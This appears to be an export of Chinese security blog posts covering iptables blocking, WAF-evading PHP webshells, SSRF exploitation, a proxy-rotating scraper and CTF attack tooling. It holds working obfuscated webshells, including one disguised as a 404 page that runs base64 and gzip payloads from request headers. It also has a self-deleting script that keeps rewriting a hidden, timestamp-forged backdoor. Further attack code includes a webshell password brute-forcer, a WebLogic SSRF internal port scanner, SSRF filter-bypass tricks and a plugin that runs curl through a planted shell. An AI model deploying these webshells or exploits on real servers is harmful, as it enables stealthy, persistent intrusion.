    <content type="text"><![CDATA[当我们的 Linux 服务器受到少量攻击时，这时候我们可以使用 iptables 来手动封禁这些攻击者的IP。 如果攻击比较大时，有时我们根本无法响应过来，iptables 基本也就无能为力了。 对于少量攻击处理的步骤应该是：获取IP –&gt; 封IP 1、获取攻击者 IP1.1 通过 netstat 获取如果攻击者攻击的是你的 Web 服务的话，默认是80端口，我们就可以使用下面的代码！ 如果攻击的不是80端口的话，将下面的两个数字80改为你被攻击的端口即可！ 如果你需要显示多条记录，请自己手动将 head -n20 调大即可1netstat -anlp|grep 80|grep tcp|awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk &apos;/:80/&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&apos; |sort -rn|head -n20 1.2 通过 tcpdump 获取在使用之前，请确保您的系统已经安装了 tcpdump 。 Debian / Ubuntu 系列快速安装如下 apt-get install -y tcpdump 安装后，使用下面的代码即可。 需要注意的是， -i eth0 指的是你主网卡，如果你是 OpenVZ 的虚拟机的话，就改成您的网卡名venet0 同样你需要设置的是， port 80 设置你被攻击的端口， -c 1000 指 tcpdump 需要统计的记录数，他会在达到这个数之后显示结果。 head -20 设置你要显示的记录条数1tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&apos; | sort | uniq -c | sort -nr |head -20 2、封禁 IP通过上面的步骤，我们已经知道是谁在攻击我们了，现在我们就可以将他们拉入 iptables 禁止他们连接到服务器了。 2.1 封禁单个 IP1iptables -I INPUT -s 211.1.2.1 -j DROP 2.2 封禁一个 IP 段1iptables -I INPUT -s 211.1.2.0/16 -j DROP 如果需要更多关于 iptables 的教程，由于不在本帖需要讲述的内容当中，请自行 Google 答案。 来源：(https://imlonghao.com/8.html)[https://imlonghao.com/8.html]]]></content>
      <tags>
        <tag>运维</tag>
        <tag>tcpdump</tag>
        <tag>iptables</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试小技巧之过waf木马]]></title>
    <url>%2F2017%2F06%2F05%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E8%BF%87waf%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[在研究webshell查杀的时候，学习别人怎么绕waf的思路，今天发现一个很6的函数(至少之前我是没见过)，然后结合之前写访问日志记录文件时用到的方法，very perfect！ Once step普通一句话木马： 1&lt;?php eval($_POST[&apos;caidao&apos;]);?&gt; Second step首先大家看下这个东西： 不知道大家看到这个字符串会有啥想法，反正说实话，之前我肯定不会太在意。看下源码：1234$compressed = gzcompress(&apos;&lt;?php eval($_POST[\&apos;caidao\&apos;]);?&gt;&apos;, 9);$uncompressed = gzuncompress($compressed);echo $compressed;?&gt; Third step那么重点来了！ 我要说的就是gzcompress这个函数。然后我又查了查相关资料，找到了PHP中具有相同功能的函数还有两个：gzdeflate，gzencode。 科普下:12345678910111213压缩函数：gzcompress gzdeflate gzencode解压函数：gzuncompress gzinflate gzdecodegzdecode是PHP 5.4.0之后才加入的，使用的时候要注意兼容性问题。这几个函数都以gz开头，让人想到gzip压缩，而光看函数名却又看不出它们之间的区别，只能查文档。gzcompress gzdeflate gzencode函数的区别在于它们压缩的数据格式不同：gzcompress使用的是ZLIB格式；gzdeflate使用的是纯粹的DEFLATE格式；gzencode使用的是GZIP格式；其实从PHP 5.4.0开始，这三个函数是一样的，只不过第三个参数的默认值不同；如果调用时传入第三个参数，那么这三个函数返回的数据相同。有兴趣的自己在找找吧 Fourth step写个生成密文的文件。 考虑到可能字符显示不全，无法识别等原因，再套一层base64。 123456if(isset($_POST[&apos;str&apos;]))&#123; $str = $_POST[&apos;str&apos;]; $compressed = base64_encode(gzcompress($str, 9)); echo $compressed;&#125;?&gt; Fifth step结合访问日志记录用到的getallheaders函数，最终的webshell如下： 1&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&apos;w2n1ck&apos;])));&gt; 用D盾查一下 虽然级别是小于3，但是说明里面显示可能eval后门，所以要去掉这个，在变形下：1&lt;?php $w2n1ck1=gzuncompress(base64_decode(getallheaders()[&apos;cai&apos;]));$w2n1ck1(gzuncompress(base64_decode(getallheaders()[&apos;dao&apos;])));&gt; 看下webshell可用性 这里注意下，使用eval的话会报错，具体的原因请查看错误详情 在安利下命令执行的一些函数：1&apos;`&apos;,eval,assert,exec,passthru,shell_exec,system,putenv,preg_replace,pcntl_exec,popen,proc_open Sixth step再用D盾检测下 还是可疑啊，那行再伪造伪造下123456789101112131415&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;?php$cai=getallheaders()[&apos;cai&apos;];$dao=getallheaders()[&apos;dao&apos;];if($cai!=&quot;&quot; and $dao!=&quot;&quot;)&#123; $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));&#125;header(&apos;HTTP/1.1 404 Not Found&apos;);?&gt;&lt;/body&gt;&lt;/html&gt; 再检测下： 360 5引擎检测下very perfect！ 如果觉得自己添加头麻烦可疑使用自带的请求头字段：123getallheaders()[&apos;Accept-Language&apos;]getallheaders()[&apos;User-Agent&apos;]getallheaders()[&apos;Accept&apos;]]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>D盾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞剖析与利用]]></title>
    <url>%2F2017%2F06%2F04%2FSSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。 Know it(让我装个逼，模仿下猪猪侠的词。。。) 什么是SSRFFreebuf:很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery） 一句话就是：利用一个可以发起网络请求的服务，当作跳板来攻击其他服务。 SSRF能干什么 探测内网信息 攻击内网或本地其他服务 穿透防火墙 。。。 怎么找SSRF漏洞 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 。。。 举几个例子： 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。 邮件系统就是接收邮件服务器地址这些地方。 文件就找ImageMagick，xml这些。 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。 SSRF怎么形成的SSRF形成的原因就是由于服务端提供了能够发起网络请求或者从其他服务器获取相关资源数据等，但是没有对相关目标地址做任何的限制或过滤，从而导致SSRF漏洞。 Hack it漏洞复现主要模仿curl来请求资源，写入相关文件，之后并显示相关数据。 ssrf.html1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;ssrf test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt; &lt;form name=&quot;input&quot; action=&quot;ssrf.php&quot; method=&quot;POST&quot;&gt; &lt;h2&gt;Search: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;&lt;/h2&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; ssrf.php1234567891011121314151617&lt;?phpif(isset($_POST[&apos;url&apos;]))&#123; $link = $_POST[&apos;url&apos;]; $filename = &apos;./&apos;.rand().&apos;.txt&apos;; $curlobj = curl_init($link); $fp = fopen($filename,&quot;w&quot;); curl_setopt($curlobj,CURLOPT_FILE,$fp); curl_setopt($curlobj,CURLOPT_HEADER,0); curl_exec($curlobj); curl_close($curlobj); fclose($fp); $fp = fopen($filename,&quot;r&quot;); $result = fread($fp,filesize($filename)); fclose($fp); echo $result;&#125;?&gt; 这里使用192.168.1.113作为边界服务器，192.168.2.3作为内网服务器。数据内网服务器地址成功显示内网服务器信息 漏洞实践这里以weblogic的SSRF为例(猪猪侠所说的神洞)。如图显示则就是存在SSRF漏洞了。 好了，到现在咱们已经知道存在这个漏洞了，然后应该怎样快速定位该服务器所在的内网地址呢? 这里目前我知道的有三种方法： 使用脚本爆破192.168.*.*，172.16.*.*-172.31.*.*，10.*.*.*这三个内网段 使用burp爆破同上 使用file:/// ，gophar://，ftp://等这些服务器允许的协议去读取proc里可能包含IP地址信息的相关文件 这里我就先简单粗暴的使用burp来一发吧。 。。。运气真特么的好。 内网探测探测内网内的所有主机及开放的端口信息。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@Index：http://www.w2n1ck.com/&apos;&apos;&apos;import Queuefrom threading import Threadimport threadingimport urllibimport urllib2import reimport requestsbase_url = &apos;http://xxx.xxx.xxx&apos;thread_list=[]port_list = [21,22,23,25,69,80,81,82,83,84,110,389,398,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]que = Queue.Queue()lock = threading.Lock()for port in port_list: que.put(port)def run(): for i in range(1,256): while que.qsize() &gt; 0: port = que.get() #print &quot;ip:172.16.2.&#123;ip&#125;:&#123;port&#125;&quot;.format(ip=i,port=port) url = &quot;http://xxx.xxx.xxx/uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.16.2.%d:%d&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot; % (i,port) try: content = requests.get(url,timeout=20,verify=False).content #ssrf检测 result1 = re.findall(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,content) result2 = re.findall(&apos;but could not connect&apos;,content) result3 = re.findall(&apos;No route to host&apos;,content) if len(result1) != 0 and len(result2) == 0 and len(result3) == 0: print &quot;http://172.16.2.&#123;ip&#125;:&#123;port&#125; is open&quot;.format(ip=i,port=port) except Exception,e: passif __name__ == &apos;__main__&apos;: for i in xrange(20): t=Thread(target=run) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() SSRF绕过技巧1、@123http://abc@127.0.0.1实际上是以用户名abc连接到站点127.0.0.1，同理http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8 2、添加端口号1http://127.0.0.1:8080 3、短地址1http://ᄒ.ws/ir 4、特殊域名12310.0.0.1.xip.io == 10.0.0.1www.10.0.0.1.xip.io == 10.0.0.1fuzz.ssrf.10.0.0.1.xip.io == 10.0.0.1 5、ip进制转换12345678910111213141516首先以 . 分割数字然后进行10进制转换16进制然后把这串十六进制合在一起再转换成8进制然后指定协议 http://，可用任意个 0 作为前缀：http://000007F000001；（在前面添加过多的 0，在实际SSRF或者XSS中有时会成为绕过过滤的大杀器）1、利用八进制IP地址绕过ping -w 0 -n 1 012.0.0.12、利用十六进制IP地址绕过ping -w 0 -n 1 0xa.0.0.13、 利用十进制的IP地址绕过ping -w 0 -n 1 167772161在PHP里使用ip2long在Python里使用inet_aton4、利用IP地址的省略写法绕过ping -w 0 -n 1 10.1 SSRF防御推荐参考：谈一谈如何在Python开发中拒绝SSRF漏洞]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>自动化</tag>
        <tag>SSRF</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫入库实战之干死反爬虫]]></title>
    <url>%2F2017%2F06%2F02%2F%E7%88%AC%E8%99%AB%E5%85%A5%E5%BA%93%E5%AE%9E%E6%88%98%E4%B9%8B%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[爬虫因为需要大量抓取网页，所以有可能会被ban IP，所以通常使用加UA、代理、XFF等伪造真实IP等策略，其中X-Forwarded-For,Client-ip,REMOTE_ADDR可以使用burp的爆破模块，四个payload随机生成就行了，本文重点使用UA、代理IP测试。 0x00 设置编码首先设置下默认编码。1234567文件编码reload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)数据库编码CREATE DATABASE &apos;proxy&apos; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;数据传输编码charset=&apos;utf8mb4&apos; 0x01 设置UA123456789101112config=&#123; &apos;NUM&apos;:10, &apos;timeout&apos;:5, &apos;USER_AGENTS&apos;:[ &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125; 可以使用字典方式，这里我为了简便就随机粘了几个。 0x02 设置交互方式数据交互使用python的PyMySQL模块，支持py2,py3。1234567891011conn = pymysql.connect( host=&apos;127.0.0.1&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;123456&apos;, db=&apos;proxy&apos;, charset=&apos;utf8mb4&apos;, )cur = conn.cursor()sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test1&apos;,&apos;100&apos;)&quot;cur.execute(sql) 0x03 代理获取代理使用免费的西刺代理(没钱-.-)，使用requests、BeautifulSoup做数据处理。1234567891011r = requests.get(url=url_xichi,headers=headers)soup = bs(r.content,&apos;lxml&apos;)datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;)for data in datas: proxys = data.find_all(name=&apos;td&apos;) ip = str(proxys[1].string) port = str(proxys[2].string) type = str(proxys[5].string).lower() avail_proxy = proxy_check(ip,port,type) if avail_proxy != None: return avail_proxy 0x04 代理验证验证代理的存活性，使用站长工具的ip定位实现1234567try: r = requests.get(url=url_check,proxies=proxylist,timeout=5) find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0] if ip == find_ip: return proxylistexcept Exception,e: pass 0x05 数据入库这里就以谷安网校的课程来爬，主要爬课程名字及对应的价格。效果如下图：附：源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：W2n1ck@Index：http://www.w2n1ck.com/&apos;&apos;&apos;import randomimport reimport requestsimport pymysqlimport sysimport timereload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)from bs4 import BeautifulSoup as bsconfig=&#123; &apos;NUM&apos;:10, &apos;timeout&apos;:5, &apos;USER_AGENTS&apos;:[ &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125;proxy = []conn = pymysql.connect( host=&apos;127.0.0.1&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;123456&apos;, db=&apos;proxy&apos;, charset=&apos;utf8mb4&apos;, )cur = conn.cursor()#sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test2&apos;,&apos;200&apos;)&quot;#cur.execute(sql)def proxy_spider(): url_xichi = &apos;http://www.xicidaili.com/nn/&apos; r = requests.get(url=url_xichi,headers=headers) soup = bs(r.content,&apos;lxml&apos;) datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;) #print datas for data in datas: proxys = data.find_all(name=&apos;td&apos;) ip = str(proxys[1].string) #ip = &apos;http://&apos;+ip port = str(proxys[2].string) type = str(proxys[5].string).lower() avail_proxy = proxy_check(ip,port,type) if avail_proxy != None: return avail_proxydef proxy_check(ip,port,type): url_check = &apos;http://ip.chinaz.com/getip.aspx&apos; proxylist = &#123;&#125; proxylist[type] = &apos;%s:%s&apos; % (ip,port) #print proxylist try: r = requests.get(url=url_check,proxies=proxylist,timeout=5) find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0] #print find_ip if ip == find_ip: return proxylist #proxy.append(find_ip) #print proxy except Exception,e: passdef decode_str(str): return str.replace(&apos; &apos;,&apos;&apos;).replace(&apos;\t&apos;,&apos;&apos;).replace(&apos;\n&apos;,&apos;&apos;).encode(&apos;utf-8&apos;)def get_title_price(url): proxy_url = proxy_spider() r = requests.get(url=url,proxies=proxy_url,timeout=20) content = r.content soup = bs(content,&apos;lxml&apos;) content_titles = soup.find_all(name=&apos;a&apos;,attrs=&#123;&apos;class&apos;:&apos;link-dark&apos;&#125;) content_prices = soup.find_all(name=&apos;span&apos;,attrs=&#123;&apos;class&apos;:&apos;price&apos;&#125;) for title,price in zip(content_titles,content_prices): tmp_title = decode_str(str(title.string)) tmp_price = decode_str(str(price.string)) print tmp_title,tmp_price sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;%s&apos;,&apos;%s&apos;)&quot;%(tmp_title,tmp_price) cur.execute(sql)if __name__==&apos;__main__&apos;: #proxy_spider() url_spider = &apos;http://edu.aqniu.com/course/explore?page=&apos; for i in range(12): spider_url = url_spider+str(i) get_title_price(spider_url) time.sleep(random.random()*1) cur.close()]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下赛相关工具]]></title>
    <url>%2F2017%2F05%2F16%2FCTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。 一、linux tcpdump使用tcpdump的重要性不用我说了吧，都懂，但是在CTF中可能会没有权限使用。但是工作中肯定会用到的，相信我，不要为CTF而CTF…（不好意思扯淡了 =.=） 1.1、过滤主机抓取所有经过eth1，目的或源地址是192.168.1.1的网络数据 tcpdump -i eth1 host 192.168.1.1指定源地址 tcpdump -i eth1 src host 192.168.1.1指定目的地址 tcpdump -i eth1 dst host 192.168.1.1 1.2、过滤端口抓取所有经过eth1，目的或源端口是25的网络数据 tcpdump -i eth1 port 25指定源端口 tcpdump -i eth1 src port 25指定目的端口 tcpdump -i eth1 dst port 25 1.3、网络过滤tcpdump -i eth1 net 192.168 tcpdump -i eth1 src net 192.168 tcpdump -i eth1 dst net 192.168 1.4、协议过滤tcpdump -i eth1 arp tcpdump -i eth1 ip tcpdump -i eth1 tcp tcpdump -i eth1 udp tcpdump -i eth1 icmp 1.5、常用表达式非 : ! or &quot;not&quot; (去掉双引号) 且 : &amp;&amp; or &quot;and&quot; 或 : || or &quot;or&quot; 抓取所有经过eth1，目的地址是192.168.1.254或192.168.1.200端口是80的TCP数据 tcpdump -i eth1 ‘((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))’抓取所有经过eth1，目标MAC地址是00:01:02:03:04:05的ICMP数据 tcpdump -i eth1 ‘((icmp) and ((ether dst host 00:01:02:03:04:05)))’抓取所有经过eth1，目的网络是192.168，但目的主机不是192.168.1.200的TCP数据 tcpdump -i eth1 ‘((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))’ 二、一句话木马一句话木马主要达到的目的就是就算别人看到了这个webshell，他们也不会用。不然别人直接利用你，用的webshell收割flag。我从自己搜集的过waf的webshell中挑了两个。12&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 原理我就不讲了，看一下你就明白了，很简单。QGV2YWwoJF9QT1NUWzBdKTs=随意变。菜刀配置填&lt;O&gt;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=&lt;/O&gt;连接密码:0（零）1&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; 菜刀连接密码:1，自己可以改改，主要学思路。 三、webshell爆破简单粗暴，只要发现，啥都不用想，拿起工具就是干！webshell爆破采用之前tools分享的思路，Apache一次允许同时提交1000个参数， IIS允许一次提交5883个参数。这里我主要用了两个，一个是K8写的GUI版本的，支持PHP、JSP、ASP、ASPX等一个是自己写的PHP的。主要代码如下：123456789101112131415161718192021221000处理for i in range(0,dics): new_group = [] for m in range(i*1000,(i+1)*1000): new_group.append(group[m]) m += 1 for n in new_group: post_data[n] = &apos;echo &quot;password is :%s&quot;;&apos; % n req = requests.post(url,data=post_data) print u&quot;正在进行第 %s 组字典爆破&quot; % str(i + 1) print req.content+&apos;****************************-SUCCESS!&apos; post_data.clear()余数处理new_group1 = []for kk in range(dics*1000, len(content)): new_group1.append(group[kk]) kk += 1for each in new_group1: post_data[each] = &apos;echo &quot;password is %s&quot;;&apos; % eachr = requests.post(url,data=post_data)print u&quot;正在进行余数字典爆破&quot;print r.content+&apos;****************************-SUCCESS!&apos; 四、批量发包程序目的很简单，就是对所在网段的其他主机批量进行某一个操作，具体怎么做，拿它干嘛，看自己思维了。主要代码如下：12345678910111213def sender(domain): #proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8888&quot;&#125; url = domain post_data =&quot;password=ls&quot; payload = &quot;header test&quot; headers = &#123;&apos;content-type&apos;: payload,&apos;User-Agent&apos;:random.choice(config[&apos;USER_AGENTS&apos;])&#125; request = urllib2.Request(url,post_data,headers) response = urllib2.urlopen(request,timeout=config[&apos;timeout&apos;]) if response.getcode() == 200: res = response.read() return res else: return 0 加入了多线程，随机UA等(其实Python的多线程很鸡肋的，你要测试过对比下时间你就知道了。原因你可以查下进程、线程关于多核CPU的利用相关的一些资料)。 五、Pocsuite神器，就不解释了。其实原理很简单，做了个批量化的框架，自己写插件。主要验证代码如下：12345678910111213141516171819202122232425262728293031323334353637def _verify(self): import re result = &#123;&#125; webshellpath = &quot;/ctf/webshell.php&quot; # 配置webshell所在目录 payload = &quot;&#123;domain&#125;&quot; + webshellpath for pwd in self.pwdList: exp_url = payload.format(domain=self.url) + &apos;?&apos; + pwd + &apos;=echo &quot;dropsec&quot;;&apos; print exp_url # exp_url = (payload.format(domain=self.url)) data = &#123; pwd : u&apos;&apos;&apos;echo &quot;dropsec&quot;;&apos;&apos;&apos; &#125; try: response = req.post(exp_url, data=data, timeout=10, verify=False) except Exception, e: return self.parse_output(result) if response.status_code != 404: result[&apos;VerifyInfo&apos;] = &#123;&#125; result[&apos;VerifyInfo&apos;][&apos;status_code&apos;] = response.status_code result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password wrong&apos; if &apos;dropsec&apos; in response.content: result[&apos;VerifyInfo&apos;][&apos;url&apos;] = exp_url result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password yes&apos; data = &#123; pwd : u&apos;&apos;&apos;system(&apos;curl http://192.168.2.3:8080/ctf/webshell.php&apos;);&apos;&apos;&apos; #pwd : u&apos;&apos;&apos;system(&apos;curl http://10.0.1.2&apos;);&apos;&apos;&apos; &#125; try: response = req.post(exp_url, data=data, timeout=10, verify=False) result[&apos;VerifyInfo&apos;][&apos;flag&apos;] = response.content return self.parse_output(result) except Exception, e: return self.parse_output(result) return self.parse_output(result) 六、批量上传文件做这个的目的其实就是因为第一次玩CTF线下赛手速慢，为了以后不在因为这个问题在跌倒而做的。PS:其实这个小功能有时候还是很有用的。我多读书多，不骗你-.-{斜眼} 七、权限维持CTF的权限维持很简单啊，就是木马别被删不就好了。并不需要提权啊什么的啊{捂脸}，有时候你考虑问题要结合实际啊，咋简单就咋来嘛。就是做个不死马就好了。PS:这种小伎俩只是对付一般的CTF比赛，对那种赛棍肯定不适用了，人家写个条件竞争的，分分钟打哭你啊{捂脸}，所以还得看情况，该反弹还是要反弹啊。123456789101112&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); //file_put_contents(__FILE__,&apos;&apos;); while(1)&#123; file_put_contents(&apos;C:\phpStudy\WWW\ctf\.config.php&apos;,&apos;&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[\&apos;n985de9\&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;&apos;); system(&apos;chmod 777 .config.php&apos;); touch(&quot;.config.php&quot;,mktime(20,15,1,11,28,2016)); usleep(100); &#125;?&gt; 上传这个文件之后，批量访问，就会一直生成木马文件。PS：大家试想下，要是比赛中存在一个一句话后门，利用批量上传程序，将这个后门批量上上传到各个靶机上，再利用批量发包程序访问这个后门，再利用pocsuite,然后。。。哈哈哈，是不是很爽。(理想很丰满啊…) 八、日志记录主要是为了网站访问记录，便于后续的问题排查，就是把各种字段的数据记录下来。12345678910111213141516date_default_timezone_set(&apos;Asia/Shanghai&apos;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //访问IP$filename = $_SERVER[&apos;PHP_SELF&apos;]; //访问的文件$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //查询的字符串$method = $_SERVER[&apos;REQUEST_METHOD&apos;]; //请求方法...$time = date(&apos;Y-m-d H:i:s&apos;,time()); //请求时间$post = file_get_contents(&quot;php://input&quot;,&apos;r&apos;); //接收POST数据$others = &apos;**********************************************************************&apos;;$logadd = &apos;访问时间：&apos;.$time.&apos;访问IP:&apos;.$ip.&apos;请求方法：&apos;.$method.&apos; &apos;.&apos;访问链接：&apos;.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;...//记录写入$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fwrite($fh,print_r($_COOKIE, true).&quot;\r\n&quot;);fwrite($fh,$others.&quot;\r\n&quot;);fclose($fh); 九、文件监控网上自己搜搜吧，很多 十、WAF网上自己搜搜吧，很多 